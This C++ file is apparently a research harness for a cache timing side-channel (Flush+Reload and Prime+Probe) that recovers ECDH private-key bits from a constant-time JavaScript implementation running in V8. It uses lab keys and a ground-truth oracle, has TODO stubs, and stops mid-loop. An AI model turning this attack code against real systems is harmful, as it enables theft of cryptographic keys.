#include <pthread.h>
#include <sched.h>
#include <unistd.h>

#include <atomic>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>

#include "v8_runtime.h"

extern "C" {
#include "arch.h"
#include "cache.h"
#include "config.h"
#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "prime_probe.h"
#include "shared_memory.h"
}

enum { cache_line_count = 2, profile_iterations = 1 << 16 };

static const uint64_t max_exec_cycles = (uint64_t)5e10;

/* PP_profile_once/PS_profile_once (src/attack/prime_probe.c) have no
 * sync_ctx-based early exit -- unlike this file's hand-rolled F+R loop,
 * it always polls for the full max_exec_cycles unless profile_iterations
 * fills first. max_exec_cycles above (5e10, a ~17s safety cap) is sized for
 * the F+R loop's early-exit case; used here it would make every PP round
 * take ~17s regardless of how long the real derive took. One ECDH derive is ~9.6M cycles (see
 * project_v8_ecdh_ct_fr); this gives comfortable margin over that, same
 * shape as quickjs_rsa_key_pool.c's own 3e9 (~1s) cap for one RSA sign. */
static const uint64_t pp_max_exec_cycles = (uint64_t)1e8;

static int victim_runs = 20;

static const char *test_name = "v8_ctjs_ecdh";

/* Set from argv in main, read by v8_victim_thread: the victim now runs on its
 * own pthread, so the paths can no longer be locals of main. Written before
 * pthread_create and never afterwards, which is the ordering that makes them
 * safe to read unsynchronized from the victim. */
static const char *source_str = nullptr;
static const char *repeat_str = nullptr;
static const char *key_path = nullptr;

static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];
static uint64_t **const probe_time = reload_time;

enum { H_NEGATE = 0, H_BITAND, H_BITXOR, handler_count };

struct handler_info {
	const char *name; /* exact V8 builtin name, as reported by the JIT event */
	uintptr_t addr;
	size_t len;
};

static handler_info handlers[handler_count] = {
	{ "NegateHandler", 0, 0 },
	{ "BitwiseAndHandler", 0, 0 },
	{ "BitwiseXorHandler", 0, 0 },
};

struct target_builtin_line {
	int handler; /* index into handlers[] */
	uint64_t off; /* byte offset of the 64 B line within that builtin */
	char role; /* '0' fires only for a 0-bit, 'c' once per BN.select */
};

/* Overridable with -cl<i>=<handler>:<off>:<role>, which is how a moved leak
 * site is found again: change the mask expression in js/ecdh_ct_eval.js and the
 * slow path moves to a different line of the same handler. */
static target_builtin_line target_lines[cache_line_count] = {
	{ H_BITAND, 0x080, '0' }, /* marker: HeapNumber(-0) slow path, 0-bit only */
	{ H_NEGATE, 0x000, 'c' }, /* clock:  exactly once per BN.select */
};

static int check_bitand(uint64_t *p, uint32_t n) {
	// TODO;
	return 0;
}

static int check_negate(uint64_t *p, uint32_t n) {
	// TODO;
	return 0;
}

/* "and:0x0c0:0" -> target_lines[cl]. The handler is matched by any unique
 * case-insensitive substring of its V8 name MINUS the "Handler" suffix, so
 * "neg"/"and"/"xor" all work -- matching the full name instead makes every
 * handler match "and", which is a substring of "Handler". */
static bool parse_target_line(int cl, const char *spec) {
	if (cl < 0 || cl >= cache_line_count) {
		log_error("-cl%d: only %d channels exist", cl, cache_line_count);
		return false;
	}
	char buf[128];
	snprintf(buf, sizeof(buf), "%s", spec);

	char *off_tok = strchr(buf, ':');
	if (!off_tok) {
		log_error("-cl%d=%s: expected <handler>:<off>[:<role>]", cl, spec);
		return false;
	}
	*off_tok++ = '\0';
	char *role_tok = strchr(off_tok, ':');
	if (role_tok) {
		*role_tok++ = '\0';
	}

	int found = -1;
	for (int h = 0; h < handler_count; ++h) {
		char base[64];
		snprintf(base, sizeof(base), "%s", handlers[h].name);
		char *suffix = strstr(base, "Handler");
		if (suffix) {
			*suffix = '\0';
		}
		if (strcasestr(base, buf)) {
			if (found >= 0) {
				log_error(
				    "-cl%d=%s: '%s' matches several handlers", cl, spec, buf);
				return false;
			}
			found = h;
		}
	}
	if (found < 0) {
		log_error("-cl%d=%s: no handler matching '%s'", cl, spec, buf);
		return false;
	}

	char *end = nullptr;
	uint64_t off = strtoull(off_tok, &end, 0);
	if (end == off_tok || *end != '\0') {
		log_error("-cl%d=%s: bad offset '%s'", cl, spec, off_tok);
		return false;
	}

	char role = target_lines[cl].role;
	if (role_tok) {
		if (strlen(role_tok) != 1 || !strchr("01c", role_tok[0])) {
			log_error("-cl%d=%s: role must be one of 0, 1, c", cl, spec);
			return false;
		}
		role = role_tok[0];
	}

	target_lines[cl].handler = found;
	target_lines[cl].off = off;
	target_lines[cl].role = role;
	return true;
}

static FR_attacker_thread_config_t fr_lines[cache_line_count];


static uint64_t fr_wait_cycles = 2000;

static i64 fr_hit_thresh = 260;

/* Which primitive polls the target lines. F+R flushes and times the target
 * line itself and needs no eviction set; P+P builds one per channel
 * (prepare_evset_thres) and times a traversal of it, which measures and
 * restores in the same pass. */
enum prim_t { PRIM_FR = 0, PRIM_PP };
static prim_t prim = PRIM_FR;
static const char *prim_name(void) {
	return prim == PRIM_FR ? "fr" : "pp";
}

/* CSI mode: instead of building an evset for a known target VA, blindly scan
 * every system-wide L3 set, keep only those matching the target line's page
 * offset, and dump each candidate's traces for offline fingerprinting. Set by
 * -csi; the identification (check_fn) itself is not wired up yet. */
static bool use_csi = false;

/* CSI ground-truth capture, on ONLY when the loaded source has `let debug = 1;`
 * (run_ecdh_ct.sh BITS=1) -- the same switch that drives the normal path's
 * oracle. The victim sets this from its own oracle_on before its CSI loop, so
 * the attacker learns it across the first window rendezvous without a separate
 * flag that could disagree with the source (see the oracle_on comment). When on,
 * identify_one_target resolves and logs the TRUE target set (which candidate
 * evset actually evicts the known target VA) and drains the victim's per-derive
 * (tsc,bit) oracle alongside each dumped candidate's traces. */
static std::atomic<bool> g_csi_oracle{ false };

/* CSI probe keys: raw-hex scalars whose bit patterns drive BN.select in a
 * distinctive way, so one candidate set's three traces form a fingerprint. Each
 * is loaded into s1 via a SET_KEY window before profiling (v8_set_key's raw-hex
 * branch). Order is fixed and shared across channels.
 *   zeros -> mostly 0-bits   (marker/0-bit line fires ~never)
 *   ones  -> mostly 1-bits   (0-bit line fires ~never, clock every step)
 *   alt   -> alternating     (0-bit line fires every other step) */
enum { csi_key_count = 3 };
static const char *csi_probe_keys[csi_key_count] = {
	"experiments/v8_constant_time_js/ec_key_zeros.hex",
	"experiments/v8_constant_time_js/ec_key_ones.hex",
	"experiments/v8_constant_time_js/ec_key_alt.hex",
};

/* Unprofiled derive() calls before profiling, so every non-select function
 * (curve field arithmetic, point bookkeeping) tiers up to TurboFan and stops
 * executing the bytecode handlers -- BN.select is pinned to the interpreter
 * from module load (see ecdh_ct_eval.js), so after warmup it is the ONLY code
 * touching them. */
static int warmup_runs = 5;

static bool name_is(const v8::JitCodeEvent *event, const char *base) {
	const char *s = event->name.str;
	size_t len = event->name.len;
	for (size_t i = 0; i < len; ++i) {
		if (s[i] == ':') {
			s += i + 1;
			len -= i + 1;
			break;
		}
	}
	size_t blen = strlen(base);
	return len == blen && memcmp(s, base, blen) == 0;
}

static void jit_event_handler(const v8::JitCodeEvent *event) {
	if (event->type != v8::JitCodeEvent::CODE_ADDED) {
		return;
	}
	if (event->code_type != v8::JitCodeEvent::JIT_CODE) {
		return;
	}
	for (int h = 0; h < handler_count; ++h) {
		if (name_is(event, handlers[h].name)) {
			handlers[h].addr = reinterpret_cast<uintptr_t>(event->code_start);
			handlers[h].len = event->code_len;
			return;
		}
	}
}

static void init_target_lines(void) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		const target_builtin_line &b = target_lines[cl];
		FR_thread_config_init(fr_lines[cl]);
		fr_lines[cl].label = handlers[b.handler].name;
		fr_lines[cl].slot = cl;
		fr_lines[cl].target = (uint8_t *)(handlers[b.handler].addr + b.off);
	}
}

static void log_channels(const char *prim) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		log_info("cl%d role '%c'  %s +0x%03lx  (%s, %p)",
		         cl,
		         target_lines[cl].role,
		         fr_lines[cl].label,
		         target_lines[cl].off,
		         prim,
		         (void *)fr_lines[cl].target);
	}
}

static void write_channel_metadata(void) {
	char dir[256], path[512];
	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/channels", dir);

	FILE *fp = fopen(path, "w");
	if (!fp) {
		log_error("could not write channel metadata to %s", path);
		return;
	}
	fprintf(fp, "# col role handler off primitive\n");
	for (int cl = 0; cl < cache_line_count; ++cl) {
		fprintf(fp,
		        "%d %c %s 0x%lx %s\n",
		        cl,
		        target_lines[cl].role,
		        fr_lines[cl].label,
		        target_lines[cl].off,
		        prim_name());
	}
	fclose(fp);
	log_info("channel metadata -> %s", path);
}

static const char *format_counts(char *buf, size_t n, const uint32_t *idx) {
	size_t at = 0;
	for (int cl = 0; cl < cache_line_count && at < n; ++cl) {
		int w =
		    snprintf(buf + at, n - at, "%scl%d %u", cl ? " " : "", cl, idx[cl]);
		if (w < 0) {
			break;
		}
		at += (size_t)w < n - at ? (size_t)w : n - at;
	}
	return buf;
}


/* ---------------------------------------------------------------------------
 * LIVE HIT-COUNT MONITOR -- catches an evset going bad MID-capture.
 *
 * An absolute ceiling on the clock channel's raw per-run hit count, checked
 * on EVERY captured run -- a single integer compare, cheap enough that there
 * is no reason to gate it behind a flag.
 * It cannot tell WHY a run is noisy (self-eviction, a scheduler hole, a
 * neighbor's cache attack -- this box is shared, see
 * machine was loaded), only THAT it was, which is enough to flag it
 * for the operator without aborting hours of otherwise-good capture over one
 * run.
 *
 * Measured 2026-08-12, 100 P+P runs each: clock channel raw hits/run
 * top out at 568 over 100 known-good runs and bottom out at 2316 over 100
 * known-bad ones -- wide margin either side of 1000. */
static const uint32_t clock_hit_ceiling = 1000;
static uint32_t clock_hit_violations = 0;

static int find_clock_cl(void) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		if (target_lines[cl].role == 'c') {
			return cl;
		}
	}
	return -1;
}

static void check_clock_hits(uint32_t n, int run_num) {
	if (n > clock_hit_ceiling) {
		++clock_hit_violations;
		log_error("run %d: clock channel hit count %u exceeds %u -- evset "
		          "may have gone bad for this run",
		          run_num,
		          n,
		          clock_hit_ceiling);
	}
}

static void report_clock_hit_violations(void) {
	if (clock_hit_violations > 0) {
		log_error("%u/%d captured run(s) exceeded the clock hit ceiling -- "
		          "check those traces before trusting the decode",
		          clock_hit_violations,
		          victim_runs);
	}
}

static bool has_suffix(const char *s, const char *suffix) {
	size_t sl = strlen(s);
	size_t fl = strlen(suffix);
	return sl >= fl && strcmp(s + sl - fl, suffix) == 0;
}

static const char *js_quote(const char *s, char *buf, size_t n) {
	size_t at = 0;
	buf[at++] = '\'';
	for (; *s && at + 3 < n; ++s) {
		if (*s == '\'' || *s == '\\') {
			buf[at++] = '\\';
		}
		buf[at++] = *s;
	}
	buf[at++] = '\'';
	buf[at] = '\0';
	return buf;
}

static void clear_samples(const uint32_t *idx) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		size_t n = idx[cl] < profile_iterations ? idx[cl] : profile_iterations;
		memset(
		    sample_tsc[cl], 0, profile_iterations * sizeof(sample_tsc[cl][0]));
		memset(reload_time[cl],
		       0,
		       profile_iterations * sizeof(reload_time[cl][0]));
	}
}

/* FLUSH+RELOAD: no eviction set at all -- it flushes and times
 * fr_lines[cl].target directly, so it needs neither prepare_evset_thres nor a
 * calibrated threshold, just -wait and -thresh. One thread polls both
 * channels. */
static void *v8_attacker_thread_fr(void *arg) {
	(void)arg;
	log_channels("FR");
	i64 threshold = fr_hit_thresh;
	const int clock_cl = find_clock_cl();

	for (int r = 0; r < victim_runs; ++r) {
		uint32_t idx[cache_line_count] = { 0 };
		for (int cl = 0; cl < cache_line_count; ++cl) {
			clflush((volatile void *)fr_lines[cl].target);
		}

		pthread_barrier_wait(sync_ctx.barrier); /* A: release victim call */
		u64 t0 = rdtscp(), t1 = t0;
		bool full = false;
		do {
			FR_wait(fr_wait_cycles);
			for (int cl = 0; cl < cache_line_count; ++cl) {
				u64 access_time = timed_access((void *)fr_lines[cl].target);
				if ((i64)access_time <= threshold &&
				    idx[cl] < profile_iterations) {
					sample_tsc[cl][idx[cl]] = rdtscp();
					reload_time[cl][idx[cl]] = access_time;
					++idx[cl];
					if (idx[cl] == profile_iterations) {
						full = true;
					}
				}
				clflush((volatile void *)fr_lines[cl].target);
			}
			t1 = rdtscp();
		} while (!full && sync_ctx_get_action() == SYNC_CTX_START &&
		         (t1 - t0) < max_exec_cycles);

		pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */

		char counts[256];
		log_info("run %d/%d: window %lu cyc, hits %s",
		         r + 1,
		         victim_runs,
		         t1 - t0,
		         format_counts(counts, sizeof(counts), idx));
		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      probe_time,
		                      cache_line_count,
		                      profile_iterations,
		                      r == 0);
		check_clock_hits(idx[clock_cl], r + 1);
		clear_samples(idx);
	}
	report_clock_hit_violations();
	return nullptr;
}

static pthread_barrier_t attacker_threads_barrier;
static PP_attacker_thread_config_t pp_cfg[cache_line_count];
static uint32_t ps_run_idx[cache_line_count];

/* PRIME+PROBE, after experiments/quickjs_jpeg/quickjs_jpeg.c: evset and
 * threshold from prepare_evset_thres, each run one PP_profile_once call. One
 * poll times a traversal of the whole set, measuring and re-priming in one
 * pass.
 *
 * A local loop rather than PP_attacker_thread because the victim is in-process
 * and profiled victim_runs times: PP_profile_once has no sync_ctx early exit
 * (so it gets pp_max_exec_cycles, not this file's 17s max_exec_cycles), and
 * the two attacker threads must rendezvous every run through
 * attacker_threads_barrier, since sync_ctx's barrier has only 2 slots.
 */
static void *v8_attacker_thread_pp(void *arg) {
	PP_attacker_thread_config_t *cfg = (PP_attacker_thread_config_t *)arg;
	const int cl = cfg->slot;
	const bool lead = (cl == 0);
	EVSet *const evset = cfg->evset;
	const int threshold = cfg->threshold;
	const int clock_cl = find_clock_cl();

	if (lead) {
		log_channels("PP");
	}
	log_info("Parallel Prime+Probe %s threshold: %d", cfg->label, threshold);

	for (int r = 0; r < victim_runs; ++r) {
		PP_profile_once(evset,
		                cl,
		                cfg->label,
		                threshold,
		                profile_iterations,
		                pp_max_exec_cycles,
		                sample_tsc,
		                probe_time);

		uint32_t index = 0;
		for (int i = 0; i < profile_iterations; ++i) {
			if (sample_tsc[cl][i] != 0) {
				++index;
			}
		}
		ps_run_idx[cl] = index;
		pthread_barrier_wait(&attacker_threads_barrier);

		if (lead) {
			char counts[256];
			log_info("run %d/%d: evictions %s",
			         r + 1,
			         victim_runs,
			         format_counts(counts, sizeof(counts), ps_run_idx));
			dump_profiling_traces(test_name,
			                      victim_runs,
			                      sample_tsc,
			                      probe_time,
			                      cache_line_count,
			                      profile_iterations,
			                      r == 0);
			check_clock_hits(ps_run_idx[clock_cl], r + 1);
			/* PP_profile_once does not clear between runs -- it does not have
			 * to, its victim runs once. Here run r+1 would otherwise dump
			 * run r's tail wherever it detected less. */
			clear_samples(ps_run_idx);
		}
		/* Nobody re-primes (PP_profile_once's next call) until the dump has
		 * been taken. */
		pthread_barrier_wait(&attacker_threads_barrier);
	}
	if (lead) {
		report_clock_hit_violations();
	}
	return nullptr;
}

enum { victim_bits_max = 1 << 8 };
static int64_t vb_ts[victim_bits_max];
static uint8_t vb_bit[victim_bits_max];
static char vb_out[victim_bits_max * 24];

/* CSI: the victim fills this with the last derive's formatted (tsc,bit) block
 * after each START window; the attacker copies it out under the (set,key) it
 * drove, once, before opening the next window. Written and read on opposite
 * sides of barrier B, so the barrier orders the handoff. */
static char g_vb_csi[victim_bits_max * 24];
static std::atomic<size_t> g_vb_csi_len{ 0 };

/* gt_n, NOT gt_len: gt_len is the fixed capacity of the two arrays, while gt_n
 * is how many slots the last ladder filled. It has to go through a script --
 * these are `let`/`const` bindings in the bundle's script scope, not properties
 * of globalThis, so they cannot be read off the global object. */
static const char victim_ground_truth[] =
    "(() => { return [gt_ts, gt_bit, gt_n]; })()";

/* Format the victim's per-bit (tsc,bit) block for the LAST derive into `buf` as
 * "tsc,bit\n" lines. Returns bytes written, 0 on any failure. Pure: the caller
 * owns where it goes -- the normal profiling path appends it to victim_bits.txt,
 * the CSI path stashes it per (set,key). Uses the shared vb_ts/vb_bit scratch;
 * only the victim thread ever calls it, so the two modes never race. */
static size_t format_victim_ground_truth(v8::Isolate *isolate,
                                         v8::Local<v8::Context> context,
                                         v8::Local<v8::Script> grab_script,
                                         char *buf,
                                         size_t bufsz) {
	v8::HandleScope handle_scope(isolate);
	v8::Local<v8::Value> got;
	if (!grab_script->Run(context).ToLocal(&got) || !got->IsArray()) {
		return 0;
	}
	v8::Local<v8::Object> triple = got.As<v8::Object>();
	v8::Local<v8::Value> ts_v, bit_v, len_v;
	if (!triple->Get(context, 0).ToLocal(&ts_v) ||
	    !triple->Get(context, 1).ToLocal(&bit_v) ||
	    !triple->Get(context, 2).ToLocal(&len_v)) {
		return 0;
	}
	if (!ts_v->IsBigInt64Array() || !bit_v->IsUint8Array()) {
		return 0;
	}
	uint32_t n = len_v->Uint32Value(context).FromMaybe(0);
	if (n == 0) {
		return 0;
	}
	if (n > victim_bits_max) {
		log_error("victim oracle: %u pairs in one run, keeping %d",
		          n,
		          victim_bits_max);
		n = victim_bits_max;
	}
	ts_v.As<v8::ArrayBufferView>()->CopyContents(vb_ts, n * sizeof(vb_ts[0]));
	bit_v.As<v8::ArrayBufferView>()->CopyContents(vb_bit,
	                                              n * sizeof(vb_bit[0]));

	size_t at = 0;
	for (uint32_t j = 0; j < n; ++j) {
		int w = snprintf(buf + at,
		                 bufsz - at,
		                 "%lld,%u\n",
		                 (long long)vb_ts[j],
		                 (unsigned)vb_bit[j]);
		if (w < 0 || (size_t)w >= bufsz - at) {
			break;
		}
		at += (size_t)w;
	}
	return at;
}

static void grab_victim_ground_truth(v8::Isolate *isolate,
                                     v8::Local<v8::Context> context,
                                     v8::Local<v8::Script> grab_script) {
	size_t at = format_victim_ground_truth(
	    isolate, context, grab_script, vb_out, sizeof(vb_out));
	if (at == 0) {
		return;
	}

	/* victim_bits.txt, NOT channels -- write_channel_metadata() owns
	 * <dir>/channels, and clobbering it would cost the decoder the col->role
	 * mapping, i.e. the whole capture rather than just the oracle. */
	char dir[256], path[512];
	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/victim_bits.txt", dir);

	/* Opened "w" on the first run and kept open, so the later runs append to
	 * the one file rather than each truncating it. */
	static FILE *fp = nullptr;
	if (fp == nullptr) {
		fp = fopen(path, "w");
	}
	if (fp == nullptr) {
		log_error("could not write ground truth to %s", path);
		return;
	}
	fwrite(vb_out, 1, at, fp);
	fflush(fp);
}

void print_helper(int argc, char *argv[]) {
	(void)argc;
	log_error(
	    "Usage: %s [options] <source.js> <repeat.js> <key_path>\n"
	    "  <key_path>           ec_key_<i>.json pool entry ({key1,key2}, "
	    "sets both parties)\n"
	    "                       or a raw-hex scalar file (sets party 1 "
	    "only)\n"
	    "  -fr                  FLUSH+RELOAD (default): flush and time the "
	    "target line\n"
	    "                       itself, no eviction set\n"
	    "  -pp                  PRIME+PROBE: time a traversal of the whole "
	    "evset, which\n"
	    "                       measures and re-primes in one pass\n"
	    "  -csi                 blind system-wide evset scan: keep only sets "
	    "matching the\n"
	    "                       target line's page offset and dump every "
	    "candidate's traces.\n"
	    "                       The three paths are optional under -csi -- they "
	    "default to\n"
	    "                       the canonical js/ and ec_key_zeros.hex under the "
	    "project root\n"
	    "  -cl<i>=<h>:<off>[:<role>]  retarget channel i, e.g. "
	    "-cl0=and:0x0c0:0\n"
	    "                       (<h> = any substring of a handler name: "
	    "neg, and, xor)\n"
	    "  -wait=<cyc>          F+R inter-poll delay (default %lu)\n"
	    "  -thresh=<cyc>        F+R hit threshold (default %ld)\n"
	    "  -runs=<n>            profiled derive() calls (default %d)\n"
	    "  -warmup=<n>          unprofiled derive() calls first (default %d)\n"
	    "\n"
	    "The victim's own per-bit (tsc, bit) ground truth is NOT a flag here: "
	    "it is on\n"
	    "whenever the <source.js> handed to us has `let debug = 1;`, which is "
	    "what\n"
	    "run_ecdh_ct.sh's BITS=1 generates. See evaluation/run_ecdh_ct.sh.\n"
	    "\n"
	    "V8 flags go AFTER all three paths.",
	    argv[0],
	    (unsigned long)fr_wait_cycles,
	    (long)fr_hit_thresh,
	    victim_runs,
	    warmup_runs);
}

/* Sets s1 (and s2, for a pool .json) from a key file, in the given context.
 * Same-process, same isolate: no cross-thread handoff needed. */
static bool v8_set_key(v8::Isolate *isolate,
                       v8::Local<v8::Context> context,
                       const char *path) {
	char key_script[4096];
	char key_path_js[2048];
	js_quote(path, key_path_js, sizeof(key_path_js));
	if (has_suffix(path, ".json")) {
		snprintf(key_script,
		         sizeof(key_script),
		         "(() => { let kp = JSON.parse(read(%s)); "
		         "s1 = ec.keyFromPrivate(kp.key1, 'hex'); "
		         "s2 = ec.keyFromPrivate(kp.key2, 'hex'); "
		         "s1_pub = s1.getPublic(); s2_pub = s2.getPublic(); "
		         "return kp.key1; })()",
		         key_path_js);
	} else {
		/* Party 2 keeps whatever the bundle set: a raw-hex file names one
		 * scalar, and it is party 1's that the attack recovers. */
		snprintf(key_script,
		         sizeof(key_script),
		         "(() => { let k = read(%s).trim(); "
		         "s1 = ec.keyFromPrivate(k, 'hex'); "
		         "s1_pub = s1.getPublic(); "
		         "return k; })()",
		         key_path_js);
	}
	v8::Local<v8::String> key_src =
	    v8::String::NewFromUtf8(isolate, key_script).ToLocalChecked();
	v8::Local<v8::Script> key_compiled;
	v8::Local<v8::Value> key_result;
	bool ok = v8::Script::Compile(context, key_src).ToLocal(&key_compiled) &&
	          key_compiled->Run(context).ToLocal(&key_result) &&
	          key_result->IsString();
	if (ok) {
		v8::String::Utf8Value key_hex(isolate, key_result);
		log_info("attack key %s (hex): %s", path, *key_hex);
	} else {
		log_error("failed to set s1 from key file %s", path);
	}
	return ok;
}

/* Everything that runs with the isolate ENTERED. It has to be its own
 * scope: v8::Isolate::Scope, the HandleScope, the TryCatch and the
 * Context::Scope must all destruct before Isolate::Dispose(), which is a
 * hard V8 CHECK -- "Disposing the isolate that is entered by a thread".
 * As function-level locals of the thread entry they were still alive at
 * the Dispose() call below and every capture aborted after its last run. */
static void v8_victim_run(v8::Isolate *isolate) {
	v8::Isolate::Scope iscope(isolate);
	v8::HandleScope scope(isolate);
	v8::TryCatch try_catch(isolate);

	isolate->SetJitCodeEventHandler(
	    static_cast<v8::JitCodeEventOptions>(v8::kJitCodeEventDefault |
	                                         v8::kJitCodeEventEnumExisting),
	    jit_event_handler);
	isolate->SetJitCodeEventHandler(v8::kJitCodeEventDefault, nullptr);

	v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
	global->Set(isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
	global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
	global->Set(
	    isolate, "readbuffer", v8::FunctionTemplate::New(isolate, ReadBuffer));
	global->Set(isolate, "print", v8::FunctionTemplate::New(isolate, Print));
	v8::Local<v8::Context> context = v8::Context::New(isolate, nullptr, global);
	v8::Context::Scope cscope(context);

	log_info("V8 runtime load source (classic script)");
	/* ecdh_ct_eval.js is a classic (non-module) bundle: its top-level
		 * `var ec = ...; var s1 = ...;` etc. become globalThis properties when
		 * run as a plain script, matching v8_ecdh's existing convention. */
	v8::Local<v8::String> source =
	    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();
	v8::Local<v8::Script> source_script;
	bool source_ok =
	    v8::Script::Compile(context, source).ToLocal(&source_script) &&
	    !source_script->Run(context).IsEmpty();

	bool key_ok = source_ok && v8_set_key(isolate, context, key_path);

	v8::Local<v8::Script> repeat_script;
	v8::Local<v8::Value> repeat_result;
	bool repeat_ok = false;
	if (key_ok) {
		v8::Local<v8::String> repeat_src =
		    v8::String::NewFromUtf8(isolate, repeat_str).ToLocalChecked();
		repeat_ok =
		    v8::Script::Compile(context, repeat_src).ToLocal(&repeat_script) &&
		    repeat_script->Run(context).ToLocal(&repeat_result) &&
		    repeat_result->IsFunction();
	}
	if (!source_ok) {
		ReportException(isolate, &try_catch);
		log_error("failed to load source script");
		return;
	} else if (!key_ok) {
		return;
	} else if (!repeat_ok) {
		ReportException(isolate, &try_catch);
		log_error("repeat script must evaluate to a function");
		return;
	}
	v8::Local<v8::Function> repeat_func = repeat_result.As<v8::Function>();

	for (int h = 0; h < handler_count; ++h) {
		log_info(LOG_BOLD_ON "%-30s %p (%zu bytes)" LOG_BOLD_OFF,
		         handlers[h].name,
		         (void *)handlers[h].addr,
		         handlers[h].len);
	}

	for (int i = 0; i < warmup_runs; ++i) {
		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
	}
	log_info("warmup done (%d unprofiled derives)", warmup_runs);

	v8::Local<v8::Script> grab_script =
	    v8::Script::Compile(context,
	                        v8::String::NewFromUtf8(isolate,
	                                                victim_ground_truth)
	                            .ToLocalChecked())
	        .ToLocalChecked();

	/* Whether the victim records its per-bit ground truth is the LOADED
	 * SOURCE's decision, not ours: run_ecdh_ct.sh's BITS=1 generates a copy
	 * with `let debug = 1;` and hands us that. Read it once, here, instead of
	 * carrying an attacker flag that could disagree with the source actually
	 * running -- a flag set with debug=0 source drains nothing, and a flag
	 * forgotten with debug=1 source records pairs and throws them away, and
	 * both look like a healthy capture that quietly has no oracle.
	 *
	 * `typeof` first so an older bundle without the binding reads as off
	 * rather than throwing a ReferenceError into the enclosing TryCatch. */
	bool oracle_on = false;
	{
		v8::Local<v8::String> dbg_src = v8::String::NewFromUtf8Literal(
		    isolate, "(typeof debug !== 'undefined' && !!debug)");
		v8::Local<v8::Value> dbg_val;
		if (v8::Script::Compile(context, dbg_src)
		        .ToLocalChecked()
		        ->Run(context)
		        .ToLocal(&dbg_val)) {
			oracle_on = dbg_val->BooleanValue(isolate);
		}
	}
	if (oracle_on) {
		log_info("victim oracle ON (debug=1 in the loaded source): its own "
		         "(tsc,bit) pairs are drained after each profiled run into "
		         "output/%s_r%05d/victim_bits.txt",
		         test_name,
		         victim_runs);
	}
	/* Publish the oracle decision so the CSI attacker thread can see it. Set
	 * here, before the victim's first barrier A below, so it is visible to the
	 * attacker by the time the first window's barrier B releases -- the attacker
	 * reads it no earlier than that (see identify_one_target). */
	if (use_csi) {
		g_csi_oracle.store(oracle_on, std::memory_order_relaxed);
		if (oracle_on) {
			log_info("CSI ground truth ON: true target set + per-(set,key) "
			         "oracle drained into output/%s/{csi_truth,victim_bits}.txt",
			         test_name);
		}
	}

	log_info("victim ready to start");

	/* CSI: the attacker (identify_ctjs_target_sets) drives every window -- it
	 * chooses the action and releases barrier A, we act on it, then rendezvous
	 * at B. SET_KEY reloads s1 from the path the attacker left in sync_ctx.data
	 * (one of the three probe keys); START runs one derive and flips the action
	 * to PAUSE so v8_csi_profile_once stops polling; EXIT ends the loop. Unlike
	 * the profiling loop below, the victim never sets START -- the attacker owns
	 * opening each window. The first barrier A doubles as the JIT/warmup
	 * rendezvous: the attacker cannot open a window until we reach it. */
	if (use_csi) {
		for (;;) {
			pthread_barrier_wait(sync_ctx.barrier); /* A: attacker set action */
			sync_ctx_action_t act = sync_ctx_get_action();
			if (act == SYNC_CTX_EXIT) {
				break;
			}
			if (act == SYNC_CTX_SET_KEY) {
				if (!v8_set_key(
				        isolate, context, (const char *)sync_ctx.data)) {
					log_error("CSI: failed to load probe key %s",
					          (const char *)sync_ctx.data);
				}
			} else if (act == SYNC_CTX_START) {
				(void)repeat_func->Call(context, context->Global(), 0, nullptr);
				/* Close the window as soon as the derive returns:
				 * v8_csi_profile_once polls while the action is still START, so
				 * this is what ends its capture instead of it spinning out the
				 * full max_cycles. */
				sync_ctx_set_action(SYNC_CTX_PAUSE);
				/* Then, still before barrier B, format this derive's own
				 * (tsc,bit) block for the attacker to pick up under the (set,key)
				 * it drove. After PAUSE so the attacker's window closes promptly;
				 * the barrier B below orders the buffer for its reader. */
				if (oracle_on) {
					g_vb_csi_len.store(
					    format_victim_ground_truth(
					        isolate, context, grab_script, g_vb_csi,
					        sizeof(g_vb_csi)),
					    std::memory_order_relaxed);
				}
			}
			pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous */
		}
		log_info("victim CSI loop done (EXIT)");
		return;
	}

	for (int r = 0; r < victim_runs; ++r) {
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
		sync_ctx_set_action(SYNC_CTX_PAUSE);

		/* Empty the nursery so the NEXT ladder does not have to. The ladder
		 * allocates ~1.3 MB per derive, so left alone V8 scavenges once per
		 * ladder inside the attacker's window -- a 190-240k cycle hole, 4-5
		 * bit slots wide, that walks the ladder at a constant rate and so
		 * blinds a contiguous band of slots in every trace. Collecting here
		 * took it from 0.80 to 0.01 stalls per run.
		 *
		 * Here rather than at the top of the loop: P+P primes before barrier
		 * A, so a collection between A and the previous B would sweep 1.3 MB
		 * against a primed set. After SYNC_CTX_PAUSE the window is closed. */
		u64 gc_t0 = rdtscp();
		isolate->RequestGarbageCollectionForTesting(
		    v8::Isolate::kFullGarbageCollection);
		if (r == 0) {
			/* Logged so a capture says in its own output whether it came
			 * from a binary with this in it. Without the line, a stale
			 * binary is indistinguishable from a fix that did not work:
			 * both show the drifting stall. */
			log_info("per-run full GC between window close and barrier B: "
			         "%lu cyc (--expose-gc)",
			         (unsigned long)(rdtscp() - gc_t0));
		}

		pthread_barrier_wait(sync_ctx.barrier); /* B */
		/* One block of (tsc,bit) pairs per profiled derive, in run order --
		 * the decoder matches them to traces by position, block i to
		 * r<i>.out. */
